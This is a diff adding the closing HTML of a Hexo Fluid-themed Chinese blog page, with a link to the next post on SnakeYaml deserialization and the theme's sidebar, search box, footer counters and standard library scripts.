+                      <a href="/2025/03/19/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="SnakeYaml反序列化">
+                        <span class="hidden-mobile">SnakeYaml反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
